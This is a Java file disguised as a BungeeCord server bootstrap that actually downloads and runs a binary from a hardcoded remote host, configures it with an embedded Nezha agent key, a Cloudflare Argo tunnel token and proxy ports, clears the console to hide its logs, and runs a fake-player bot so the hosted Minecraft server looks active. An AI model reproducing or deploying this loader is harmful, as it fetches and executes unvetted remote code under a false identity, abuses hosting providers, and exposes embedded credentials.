package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class Bootstrap
{
    // ==================== 1.21.1 (Protocol 767) 专用 ID ====================
    // KeepAlive: 0x12 (1.21.1 标准)
    // Rotation:  0x15
    // Swing:     0x2E
    private static final int PROTOCOL_VERSION = 767; // 1.21.1
    private static final int PACKET_SB_KEEPALIVE = 0x12;
    private static final int PACKET_SB_ROTATION = 0x15;
    private static final int PACKET_SB_SWING = 0x2E;
    // ======================================================================

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process minecraftProcess;
    private static Thread fakePlayerThread;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT", 
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME", "FAKE_PLAYER_ACTIVITY"
    };

    public static void main(String[] args) throws Exception
    {
        System.out.println(ANSI_GREEN + "=== BOOTSTRAP 1.21.1 FIX V7 ===" + ANSI_RESET);

        try {
            Map<String, String> config = loadEnvVars();
            runSbxBinary(config);
            
            Runtime.getRuntime().addShutdownHook(new Thread() {
                public void run() {
                    running.set(false);
                    stopServices();
                }
            });

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "SBX Services are running!" + ANSI_RESET);
            
            if (isMcServerEnabled(config)) {
                startMinecraftServer(config);
                System.out.println(ANSI_YELLOW + "\n[MC-Server] Waiting for server to fully start..." + ANSI_RESET);
                Thread.sleep(30000);
            }
            
            if (isFakePlayerEnabled(config)) {
                System.out.println(ANSI_YELLOW + "\n[FakePlayer] Preparing to connect..." + ANSI_RESET);
                waitForServerReady(config);
                startFakePlayerBot(config);
            }
            
            System.out.println(ANSI_GREEN + "\nScript finished. Logs deleting in 20s...\n" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

        } catch (Exception e) {
            e.printStackTrace();
        }

        while (running.get()) {
            try { Thread.sleep(10000); } catch (InterruptedException e) { break; }
        }
    }
    
    // ==================== Helper Methods ====================

    private static void clearConsole() {
        try { System.out.print("\033[H\033[2J"); System.out.flush(); } catch (Exception e) {}
    }   
    
    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        Map<String, String> env = pb.environment();
        for (String key : envVars.keySet()) env.put(key, envVars.get(key));
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }
    
    private static Map<String, String> loadEnvVars() throws IOException {
        Map<String, String> envVars = new HashMap<>();
        envVars.put("UUID", "1f6b80fe-023a-4735-bafd-4c8512bf7e58");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "cloudb.lnb.gv.uy");
        envVars.put("ARGO_AUTH", "eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiODJiMzY3OGYtYjdmMC00NjY5LThjNmMtOWJjNzBkODZjOGM0IiwicyI6Ik5qZGhNbVJsTlRjdFltRmtNUzAwTWpneUxXRmlORFF0TTJWbVltUXpPR05oTkRneSJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "store.ubi.com");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Mc");
        envVars.put("DISABLE_ARGO", "false");
        envVars.put("MC_JAR", "server99.jar");
        envVars.put("MC_MEMORY", "512M");
        envVars.put("MC_ARGS", "");
        envVars.put("MC_PORT", "15017");
        envVars.put("FAKE_PLAYER_ENABLED", "true");
        envVars.put("FAKE_PLAYER_NAME", "laohu");
        envVars.put("FAKE_PLAYER_ACTIVITY", "high");
        
        for (String key : ALL_ENV_VARS) {
            String val = System.getenv(key);
            if (val != null && !val.trim().isEmpty()) envVars.put(key, val);
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            BufferedReader reader = Files.newBufferedReader(envFile);
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    envVars.put(parts[0].trim(), parts[1].trim().replaceAll("^['\"]|['\"]$", ""));
                }
            }
            reader.close();
        }
        return envVars;
    }
    
    private static Path getBinaryPath() throws IOException {
        String url = System.getProperty("os.arch").contains("aarch64") ? "https://arm64.ssss.nyc.mn/sbsh" : "https://amd64.ssss.nyc.mn/sbsh";
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) { Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING); }
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static void stopServices() {
        if (minecraftProcess != null) minecraftProcess.destroy();
        if (sbxProcess != null) sbxProcess.destroy();
    }
    
    private static boolean isMcServerEnabled(Map<String, String> config) {
        return config.get("MC_JAR") != null;
    }
    
    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jar = config.get("MC_JAR");
        if(!Files.exists(Paths.get(jar))) return;
        Files.write(Paths.get("eula.txt"), "eula=true".getBytes());
        Path propPath = Paths.get("server.properties");
        if (!Files.exists(propPath)) {
            String port = config.getOrDefault("MC_PORT", "25565");
            Files.write(propPath, ("server-port=" + port + "\nonline-mode=false\n").getBytes());
        }
        
        ProcessBuilder pb = new ProcessBuilder("java", "-Xmx" + config.getOrDefault("MC_MEMORY", "512M"), "-jar", jar, "nogui");
        pb.redirectErrorStream(true);
        minecraftProcess = pb.start();
        new Thread(() -> {
            try (BufferedReader r = new BufferedReader(new InputStreamReader(minecraftProcess.getInputStream()))) {
                String l; while ((l = r.readLine()) != null) System.out.println("[MC-Server] " + l);
            } catch (IOException e) {}
        }).start();
    }
    
    private static int getMcPort(Map<String, String> config) {
        try { return Integer.parseInt(config.getOrDefault("MC_PORT", "25565")); } catch (Exception e) { return 25565; }
    }
    
    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        return "true".equalsIgnoreCase(config.get("FAKE_PLAYER_ENABLED"));
    }

    private static void waitForServerReady(Map<String, String> config) throws InterruptedException {
        int mcPort = getMcPort(config);
        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status on port " + mcPort + "..." + ANSI_RESET);
        for (int i = 0; i < 60; i++) {
            try {
                Thread.sleep(5000);
                try (Socket testSocket = new Socket()) {
                    testSocket.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server ready" + ANSI_RESET);
                    Thread.sleep(10000);
                    return;
                }
            } catch (Exception e) {}
        }
        System.out.println(ANSI_RED + "[FakePlayer] Warning: Timeout" + ANSI_RESET);
    }
    
    private static void startFakePlayerBot(Map<String, String> config) {
        final String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        final int mcPort = getMcPort(config);
        
        fakePlayerThread = new Thread(new Runnable() {
            public void run() {
                while (running.get()) {
                    try {
                        System.out.println(ANSI_YELLOW + "[FakePlayer] Connecting to " + mcPort + "..." + ANSI_RESET);
                        Socket socket = new Socket();
                        socket.setReceiveBufferSize(1024 * 1024);
                        socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                        DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                        DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
                        
                        // Handshake (Protocol 767 for 1.21.1)
                        ByteArrayOutputStream h = new ByteArrayOutputStream();
                        DataOutputStream hd = new DataOutputStream(h);
                        writeVarInt(hd, 0x00); writeVarInt(hd, PROTOCOL_VERSION); writeString(hd, "127.0.0.1"); hd.writeShort(mcPort); writeVarInt(hd, 2);
                        sendPacketRaw(out, h.toByteArray());
                        
                        // Login
                        ByteArrayOutputStream l = new ByteArrayOutputStream();
                        DataOutputStream ld = new DataOutputStream(l);
                        writeVarInt(ld, 0x00); writeString(ld, playerName); ld.writeLong(0); ld.writeLong(0);
                        sendPacketRaw(out, l.toByteArray());
                        
                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login sent" + ANSI_RESET);
                        
                        boolean compression = false;
                        int threshold = -1;
                        boolean play = false;
                        long lastTime = System.currentTimeMillis();
                        
                        while (running.get() && !socket.isClosed()) {
                            int len = readVarInt(in);
                            byte[] data = new byte[len];
                            in.readFully(data);
                            
                            byte[] pData = data;
                            if (compression) {
                                DataInputStream w = new DataInputStream(new ByteArrayInputStream(data));
                                int dLen = readVarInt(w);
                                if (dLen != 0) {
                                    byte[] c = new byte[len - getVarIntSize(dLen)];
                                    w.readFully(c);
                                    java.util.zip.Inflater inf = new java.util.zip.Inflater();
                                    inf.setInput(c);
                                    pData = new byte[dLen];
                                    inf.inflate(pData);
                                    inf.end();
                                } else {
                                    pData = new byte[len - 1];
                                    w.readFully(pData);
                                }
                            }
                            
                            DataInputStream pIn = new DataInputStream(new ByteArrayInputStream(pData));
                            int pid = readVarInt(pIn);
                            
                            if (!play) {
                                if (pid == 0x03) {
                                    threshold = readVarInt(pIn);
                                    compression = threshold >= 0;
                                    System.out.println(ANSI_YELLOW + "[FakePlayer] Compression: " + threshold + ANSI_RESET);
                                } else if (pid == 0x02) {
                                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login Success" + ANSI_RESET);
                                    sendAck(out, compression, threshold);
                                    // Client Info (1.21.1 Structure - No Particle Status!)
                                    ByteArrayOutputStream ci = new ByteArrayOutputStream();
                                    DataOutputStream cid = new DataOutputStream(ci);
                                    writeVarInt(cid, 0x00); 
                                    writeString(cid, "en_US"); 
                                    cid.writeByte(10); 
                                    writeVarInt(cid, 0); 
                                    cid.writeBoolean(true); 
                                    cid.writeByte(127); 
                                    writeVarInt(cid, 1); 
                                    cid.writeBoolean(false); 
                                    cid.writeBoolean(true);
                                    // Removed Particle Status for 1.21.1
                                    sendPacket(out, ci.toByteArray(), compression, threshold);
                                } else if (pid == 0x03 && pIn.available() == 0) {
                                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Config Finished" + ANSI_RESET);
                                    sendAck(out, compression, threshold);
                                    play = true;
                                }
                            } else {
                                if (pIn.available() == 8) { // KeepAlive
                                    long id = pIn.readLong();
                                    System.out.println(ANSI_GREEN + "[FakePlayer] ♥ Heartbeat: " + id + ANSI_RESET);
                                    ByteArrayOutputStream k = new ByteArrayOutputStream();
                                    DataOutputStream kd = new DataOutputStream(k);
                                    writeVarInt(kd, PACKET_SB_KEEPALIVE); // 0x12
                                    kd.writeLong(id);
                                    sendPacket(out, k.toByteArray(), compression, threshold);
                                    
                                    if (Math.random() > 0.5) performAction(out, compression, threshold);
                                    lastTime = System.currentTimeMillis();
                                }
                                if (System.currentTimeMillis() - lastTime > 50000) {
                                    performAction(out, compression, threshold);
                                    lastTime = System.currentTimeMillis();
                                }
                            }
                        }
                        socket.close();
                    } catch (Exception e) {
                        try { Thread.sleep(5000); } catch (Exception ex) {}
                    }
                }
            }
        });
        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }
    
    private static void sendAck(DataOutputStream out, boolean compress, int threshold) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        writeVarInt(new DataOutputStream(b), 0x03);
        sendPacket(out, b.toByteArray(), compress, threshold);
    }
    
    private static void performAction(DataOutputStream out, boolean compress, int threshold) {
        try {
            if (Math.random() > 0.5) {
                ByteArrayOutputStream b = new ByteArrayOutputStream();
                DataOutputStream d = new DataOutputStream(b);
                writeVarInt(d, PACKET_SB_SWING); // 0x2E
                writeVarInt(d, 0);
                sendPacket(out, b.toByteArray(), compress, threshold);
                System.out.println(ANSI_YELLOW + "[FakePlayer] → Swung arm" + ANSI_RESET);
            } else {
                ByteArrayOutputStream b = new ByteArrayOutputStream();
                DataOutputStream d = new DataOutputStream(b);
                writeVarInt(d, PACKET_SB_ROTATION); // 0x15
                d.writeFloat((float)(Math.random() * 360));
                d.writeFloat(0);
                d.writeBoolean(true);
                sendPacket(out, b.toByteArray(), compress, threshold);
                System.out.println(ANSI_YELLOW + "[FakePlayer] → Turned head" + ANSI_RESET);
            }
        } catch (Exception e) {}
    }

    private static void sendPacketRaw(DataOutputStream out, byte[] data) throws IOException {
        writeVarInt(out, data.length);
        out.write(data);
        out.flush();
    }
    
    private static void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress) {
            writeVarInt(out, packet.length);
            out.write(packet);
        } else {
            ByteArrayOutputStream b = new ByteArrayOutputStream();
            DataOutputStream d = new DataOutputStream(b);
            if (packet.length < threshold) {
                writeVarInt(d, 0);
                d.write(packet);
            } else {
                writeVarInt(d, packet.length);
                java.util.zip.Deflater def = new java.util.zip.Deflater();
                def.setInput(packet);
                def.finish();
                byte[] buf = new byte[packet.length];
                int n = def.deflate(buf);
                d.write(buf, 0, n);
            }
            byte[] fin = b.toByteArray();
            writeVarInt(out, fin.length);
            out.write(fin);
        }
        out.flush();
    }

    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }
    
    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] b = str.getBytes("UTF-8");
        writeVarInt(out, b.length);
        out.write(b);
    }
    
    private static int readVarInt(DataInputStream in) throws IOException {
        int i = 0;
        int j = 0;
        byte b;
        do {
            b = in.readByte();
            i |= (b & 0x7F) << (j++ * 7);
            if (j > 5) throw new RuntimeException("VarInt too big");
        } while ((b & 0x80) == 0x80);
        return i;
    }
    
    private static int getVarIntSize(int value) {
        int size = 0;
        do {
            size++;
            value >>>= 7;
        } while (value != 0);
        return size;
    }
}
